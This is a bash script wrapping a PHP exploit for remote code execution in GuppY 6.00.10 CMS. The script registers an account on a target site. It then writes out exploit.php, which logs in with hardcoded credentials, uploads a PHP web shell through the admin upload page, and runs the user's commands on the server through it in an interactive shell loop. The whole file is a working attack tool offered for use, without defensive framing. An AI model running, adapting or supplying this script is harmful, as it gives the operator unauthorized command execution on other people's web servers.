#!/bin/bash


green='\033[0;32m'
orange='\033[0;33m'
nc='\033[0m'

echo -e "${orange} [+] # Made by Nketiah-Godfred ${nc}"
echo " "

echo "enter the target ip address (e.g. http://10.0.50.0/guppy/ or http://10.0.50.0/):"
read -p "base ip: " target_ip
target_ip=$(echo "$target_ip" | tr '[:upper:]' '[:lower:]')

echo " "
echo "enter the following details to create a new account:"
echo " "
read -p "username: " username
echo " " 
while true; do
    read -p "password (minimum 8 characters): " password
    if [ ${#password} -ge 8 ]; then
        break
    else
        echo "[-] password must be at least 8 characters long. please try again."
    fi
done

password_confirm="$password"

while true; do
    read -p "email: " email
    if [[ "$email" =~ @ ]]; then
        break
    else
        echo "[-] please enter a valid email address with '@'."
    fi
done

urlencode() {
    local input="${1}"
    local output=""
    local i
    local c
    for (( i=0; i<${#input}; i++ )); do
        c="${input:i:1}"
        case "$c" in
            [a-zA-Z0-9.~_-]) output+="$c" ;;
            *) printf -v output "%s%%%02X" "$output" "'$c" ;;
        esac
    done
    echo "$output"
}

encoded_username=$(urlencode "$username")
encoded_password=$(urlencode "$password")
encoded_email=$(urlencode "$email")

post_data="validform=send&code_pseudo=&apseudo=$encoded_username&apass=$encoded_password&apass2=$encoded_password&aemail=$encoded_email"

response=$(curl -s -w "%{http_code}" -o /dev/null -X POST "$target_ip" \
    -H "content-type: application/x-www-form-urlencoded" \
    --data "$post_data")

if [ "$response" -eq 200 ]; then
    echo "[+] account created successfully!"
else
    echo "[-] failed to create account. http status: $response"
fi

echo "[+] creating the exploit.php file..."


echo "Type <exit> to quit the exploit"

cat << 'EOF' > exploit.php
<?php

$username = "anotheradmin"; 
$password = "admin12345@";

$options = getopt('u:c:'); 

if (!isset($options['u'], $options['c'])) {
    die("\n guppy 6.00.10 cms remote code execution \n author: chokri hammedi \n\n usage : php exploit.php -u http://target.org/ -c whoami\n\n");
}

$target = rtrim($options['u'], '/'); 
$command = $options['c'];

$cookie = "cookie.txt"; 
$url = "{$target}/connect.php";

$postdata = "connect=on&uuser=old&pseudo={$username}&uid={$password}";
$curlObj = curl_init();

curl_setopt($curlObj, CURLOPT_URL, $url);
curl_setopt($curlObj, CURLOPT_HEADER, 0);  
curl_setopt($curlObj, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curlObj, CURLOPT_POSTFIELDS, $postdata); 
curl_setopt($curlObj, CURLOPT_POST, 1); 
curl_setopt($curlObj, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curlObj, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($curlObj, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($curlObj, CURLOPT_TIMEOUT, 30);
curl_setopt($curlObj, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($curlObj, CURLOPT_COOKIEJAR, $cookie);
$result = curl_exec($curlObj);

$url2 = "{$target}/admin/admin.php?lng=en&pg=upload";

$post = <<<EOD
------webkitformboundaryga1apfculkiawal4
content-disposition: form-data; name="rep"

file
------webkitformboundaryga1apfculkiawal4
content-disposition: form-data; name="ficup"; filename="shell.php"
content-type: application/x-php

<?php system(\$_get["cmd"]); ?>

------webkitformboundaryga1apfculkiawal4--
EOD;

$headers = [
    'content-type: multipart/form-data; boundary=----webkitformboundaryga1apfculkiawal4',
    'user-agent: mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/103.0.5060.114 safari/537.36',
    'accept-encoding: gzip, deflate',
    'accept-language: en-us,en;q=0.9'
];

curl_setopt($curlObj, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curlObj, CURLOPT_URL, $url2);
curl_setopt($curlObj, CURLOPT_POSTFIELDS, $post);
curl_setopt($curlObj, CURLOPT_POST, true);
curl_setopt($curlObj, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curlObj, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curlObj, CURLOPT_FOLLOWLOCATION, true);

$data = curl_exec($curlObj);

$shell = "{$target}/file/shell.php?cmd=" . urlencode($command);
curl_setopt($curlObj, CURLOPT_URL, $shell);
curl_setopt($curlObj, CURLOPT_HTTPHEADER, ['content-type: application/x-www-form-urlencoded']);
curl_setopt($curlObj, CURLOPT_POST, false);

$exec_shell = curl_exec($curlObj);

$code = curl_getinfo($curlObj, CURLINFO_HTTP_CODE);

if ($code != 200) {
    echo "\n\n[-] something went wrong! please check the credentials or target url.\n";
} else {
    echo " ";
    echo $exec_shell;
    echo " ";
}

curl_close($curlObj);
?>
EOF

while true; do
    read -p "cmd> " command
    if [[ "$command" == "exit" || "$command" == "quit" ]]; then
        echo -e "${green}[+] exiting....${nc}"
        break
    fi
    echo -e "${green}[+] Executing command: $command${nc}"
    php exploit.php -u "$target_ip" -c "$command"
    sleep 0.5
done

rm -f ./exploit.php
rm -f ./cookie.txt
echo "[*] Done"